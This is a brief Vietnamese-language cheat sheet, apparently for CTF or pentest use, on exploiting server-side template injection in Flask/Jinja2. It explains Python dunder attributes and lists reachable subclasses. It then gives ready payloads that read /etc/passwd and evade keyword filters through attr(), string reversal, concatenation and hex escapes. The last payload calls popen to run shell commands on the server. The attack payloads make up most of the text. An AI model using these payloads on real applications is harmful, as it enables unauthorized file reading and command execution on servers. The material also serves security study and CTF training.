* __class__ trả về lớp của đối tượng hiện tại.
* __bases__ cho phép truy cập tới lớp cha của đối tượng hiện tại.
* __subclasses__() trả về danh sách các lớp con của đối tượng hiện tại.
* __init__ là phương thức khởi tạo lớp.
* __globals__ trả về tất cả module, phương thức, biến có thể sử dụng.


_frozen_importlib._ModuleLock
_frozen_importlib._DummyModuleLock
_frozen_importlib._ModuleLockManager
_frozen_importlib._installed_safely
_frozen_importlib.ModuleSpec
_frozen_importlib_external.FileLoader
_frozen_importlib_external._NamespacePath
_frozen_importlib_external._NamespaceLoader
_frozen_importlib_external.FileFinder
codecs.IncrementalEncoder
codecs.IncrementalDecoder
codecs.StreamReaderWriter
codecs.StreamRecoder
os._wrap_close
_sitebuiltins._Printer
types.DynamicClassAttribute
types._GeneratorWrapper
warnings.WarningMessage
warnings.catch_warnings
contextlib._GeneratorContextManagerBase
contextlib._BaseExitStack

## bypass filter

* Sử dụng request.args === request.values
request.args là một đối tượng trong framework Flask của Python, chứa tất cả các đối số được truyền từ URL vào ứng dụng Flask.
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
* Sử dụng attr()
Có thể kết hợp | và hàm attr() để bypass các ký tự bị filter như .. Ví dụ:
()|attr('__class__')
* Kỹ thuật đảo ngược chuỗi
{{()['__ssalc__'[::-1]]}}
* Kỹ thuật ghép chuỗi
()['__cla'+'ss__']
* Sử dụng hàm lower()
* Sử dụng hàm pop()




# Payload
{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("cat\x20app\x2epy")["read"]()}}
